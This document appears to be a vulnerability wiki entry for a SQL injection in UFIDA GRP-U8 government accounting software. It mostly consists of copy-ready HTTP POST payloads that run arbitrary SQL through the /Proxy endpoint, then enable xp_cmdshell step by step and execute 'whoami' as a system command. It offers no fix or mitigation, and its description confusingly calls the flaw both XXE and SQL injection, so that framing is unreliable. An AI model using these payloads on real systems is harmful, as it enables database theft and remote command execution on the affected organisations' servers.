# UFIDA GRP-U8 Proxy SQL Injection CNNVD-201610-923

## Vulnerability Description

There is an XXE vulnerability in UFIDA GRP-u8. This vulnerability originates from the application's lack of loading of the external entity when parsing XML input, resulting in the loading of external SQL statements and command execution.

## Affect Version

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">UFIDA GRP-U8 administrative and business internal control management software (new government accounting system special edition)</span>

## Network surveying and mapping



## Vulnerability reappears

Vulnerability POC request package

```xml
POST /Proxy HTTP/1.1
Accept: Accept: */*
Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host
Content-Length: 357
Connection: Keep-Alive
Cache-Control: no-cache


cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
```

After requesting, press F12 to view the source code to get the SQL statement query results



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/yongyou-1.png)



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/yongyou-2.png)



You can also call `xp_cmdshell` to execute system commands (most of this system is `windows`)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/yongyou-3.png)

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Note: Most of the xp_cmdshell module are not enabled by default</span>



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/yongyou-4.png)



You can use the following method to open the `xp_cmdshell method`

Send the following POST data in order (`Note that master is changed to the current database name`)

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">use master</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec sp_configure 'show advanced options',1</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">reconfigure</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec sp_configure 'xp_cmdshell',1</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">reconfigure</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

Send the following data successfully (or may fail)

```xml
cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "whoami"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Error reported during execution java.sql.SQLException【Error code: 0; Related information: xxxxxx】Never mind</span>

After sending a request and using this module, the system command will be successfully requested to be executed.